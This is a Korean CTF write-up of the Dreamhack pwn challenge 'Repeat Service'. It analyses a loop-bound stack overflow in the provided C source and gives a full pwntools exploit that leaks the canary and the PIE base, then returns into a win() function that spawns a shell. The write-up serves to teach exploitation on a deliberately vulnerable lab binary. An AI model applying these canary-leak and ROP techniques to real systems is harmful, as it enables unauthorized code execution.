---
title: "Repeat Service writeup"
date: 2026-03-31 00:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, bof, canary, pie, dreamhack]
---

반복문 경계 검사로 BOF를 터뜨리는 아이디어가 재밌는 문제였다.

## Analysis

### checksec

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

모든 보호 기법이 걸려 있다.

### Source Code

```c
// gcc -o main main.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void win() {
	system("/bin/sh");
}

int main() {
	initialize();

	char inp[80] = {0};
	char buf[1000] = {0};

	puts("Welcome to the Repeat Service!");
	puts("Please put your string and length.");

	while (1) {
		printf("Pattern: ");
		int len = read(STDIN_FILENO, inp, 80);
		if (len == 0)
			break;
		if (inp[len - 1] == '\n') {
			inp[len - 1] = 0;
			len--;
		}

		int target_len = 0;
		printf("Target length: ");
		scanf("%d", &target_len);

		if (target_len > 1000) {
			puts("Too long :(");
			break;
		}

		int count = 0;
		while (count < target_len) {
			memcpy(buf + count, inp, len);
			count += len;
		}

		printf("%s\n", buf);
	}
	return 0;
}
```

최대 80바이트까지 입력할 수 있고 `target_len`이 가질 수 있는 최댓값은 `1000`이다. 입력한 패턴 단위로 반복해서 `buf`에 복사할 수 있다.

```
pwndbg> disass main
Dump of assembler code for function main:
   ...
   0x0000555555555489 <+511>:   lea    rax,[rbp-0x3f0]
   0x0000555555555490 <+518>:   mov    rdi,rax
   0x0000555555555493 <+521>:   call   0x5555555550c0 <puts@plt>
   ...
```

`buf`가 `rbp-1008`에서 시작하는 것을 알 수 있다.

## Vulnerability Analysis

`while (count < target_len)`의 조건을 보면 `target_len`의 최댓값은 `1000`이지만 입력한 패턴의 크기가 `1000`의 약수가 아니라면 `1000`을 넘길 수 있고, 따라서 BOF 취약점이 존재한다. 소스 파일에 `win()`이 주어졌으므로 `ret`을 덮어써서 `win()`을 호출시킬 수 있을 것이다. 단, 모든 보호 기법이 켜져 있기 때문에 우선적으로 카나리를 유출하고, 바이너리가 적재된 주소도 유출해야 한다.

`buf`가 `rbp-1008`에서 시작하므로 카나리가 `buf`로부터 `1000`바이트 거리에 있다는 것을 알 수 있다. 다만 `printf("%s\n", buf);`로 유출해야 하기 때문에 카나리의 널 바이트까지인 `1001`바이트를 널 바이트가 아닌 값으로 덮어써야 한다.

우리가 입력할 수 있는 패턴의 최대 크기는 80바이트이다. 또한 `buf`는 입력한 패턴의 크기 단위로 반복해서 복사되기 때문에 카나리를 유출하려면 패턴 크기가 `1001`의 약수여야 한다. 뿐만 아니라 `target_len`의 최댓값이 `1000`이기 때문에, `1000` 이하인 배수 중 가장 큰 값에 패턴 크기를 한 번 더 더했을 때 `target_offset`이 되어야 한다. 코드로 표현하면 아래와 같다. `target_offset`이 `1001`이라고 가정한다.

```python
def find_pattern_size(target_offset):
    for pattern_size in range(80, 0, -1):
        if target_offset % pattern_size == 0:
            if (target_offset - pattern_size) < 1000:
                return pattern_size
    return None
```

위 코드를 사용하면 카나리를 유출하기 위한 정확한 패턴의 크기를 구할 수 있을 것이다.

이제 바이너리가 적재된 주소를 구해야 한다. 스택에 libc가 저장해 놓은 `main` 주소가 있는지 확인해봐야 한다.

```
root@a237909c5b9c:/pwn/repeat_service# gdb -q ./main_patched 
...
pwndbg> disass main
Dump of assembler code for function main:
   0x000000000000128a <+0>:     endbr64 
   0x000000000000128e <+4>:     push   rbp
   0x000000000000128f <+5>:     mov    rbp,rsp
   0x0000000000001292 <+8>:     sub    rsp,0x450
...
pwndbg> b *main+8
Breakpoint 1 at 0x1292
pwndbg> r
Starting program: /pwn/repeat_service/main_patched 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555555292 in main ()
...
pwndbg> tele $rbp 
00:0000│ rbp rsp 0x7fffffffe500 ◂— 1
01:0008│+008     0x7fffffffe508 —▸ 0x7ffff7c29d90 (__libc_start_call_main+128) ◂— mov edi, eax
02:0010│+010     0x7fffffffe510 ◂— 0
03:0018│+018     0x7fffffffe518 —▸ 0x55555555528a (main) ◂— endbr64
04:0020│+020     0x7fffffffe520 ◂— 0x1ffffe600
05:0028│+028     0x7fffffffe528 —▸ 0x7fffffffe618 —▸ 0x7fffffffe85c ◂— '/pwn/repeat_service/main_patched'
06:0030│+030     0x7fffffffe530 ◂— 0
07:0038│+038     0x7fffffffe538 ◂— 0x84686ee84851ae83
```

`0x7fffffffe518`에 `main`의 주소가 저장된 것을 확인할 수 있다. 이 주소를 유출해야 한다. `buf`가 `rbp-1008`에서 시작했고 `main`은 `ret`이 저장된 위치에서 `16`바이트 뒤에 저장되어 있다. `rbp+8`에 `ret`이 저장되어 있으므로 `buf`와 `main`이 저장된 곳 사이의 거리는 `1032`이다. 카나리를 유출할 때와 동일한 방법으로 정확한 패턴의 크기를 구할 수 있다.

## Exploit

이제 카나리와 바이너리가 적재된 주소를 모두 구했다. `win()`으로 흐름을 제어하기 위해 우선 `win()`을 저장할 위치를 찾은 다음 값을 쓰고, 스택 정렬을 위한 ret 가젯을 깔아야 하며, 이후에 카나리를 복원하는 순서로 진행해야 한다.

이번에 찾아야 하는 것은 `win()`을 저장할 위치 + `8`이다. 이번에는 유출이 아니라 써야 하기 때문이다. 패턴의 크기 조건을 모두 만족하면서 스택 정렬 조건도 만족해야 한다. 해당 위치는 아까 찾았던 `main`이 저장된 위치, 즉 거리가 `1032`인 곳이다. 이 수의 `80` 이하이면서 가장 큰 약수는 `43`이다. 이 크기는 카나리, ret 가젯, `win()` 주소를 모두 담고도 남는다. 따라서 패턴 앞쪽을 패딩으로 채우고 뒤쪽에 카나리, ret 가젯, `win()` 주소를 순서대로 넣어주면 된다.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 8978)

    return r


def find_pattern_size(target_offset):
    for pattern_size in range(80, 0, -1):
        if target_offset % pattern_size == 0:
            if (target_offset - pattern_size) < 1000:
                return pattern_size
    return None


def main():
    r = conn()

    # leak canary
    pattern_size = find_pattern_size(1001)
    r.sendafter(b"Pattern: ", b"A" * pattern_size)
    r.sendlineafter(b"Target length: ", b"1000")
    r.recvn(1001)
    canary = b"\x00" + r.recvn(7)

    # leak main
    pattern_size = find_pattern_size(1032)
    r.sendafter(b"Pattern: ", b"A" * pattern_size)
    r.sendlineafter(b"Target length: ", b"1000")
    r.recvn(1032)
    main = u64(r.recvn(6) + 2*b"\x00")

    # calculate absolute addresses of win and gadget
    bin_base = main - exe.symbols["main"]
    win = bin_base + exe.symbols["win"]
    gadget = bin_base + ROP(exe).find_gadget(["ret"])[0]

    # construct final payload: restore canary, dummy SFP, and ROP chain (ret -> win)
    pattern_size = find_pattern_size(1032)
    pattern = (canary + b"A"*8 + p64(gadget) + p64(win)).rjust(pattern_size, b"A")
    r.sendafter(b"Pattern: ", pattern)
    r.sendlineafter(b"Target length: ", b"1000")

    # break loop
    r.sendafter(b"Pattern: ", b"DUMMY")
    r.sendlineafter(b"Target length: ", b"1001")

    r.interactive()


if __name__ == "__main__":
    main()
```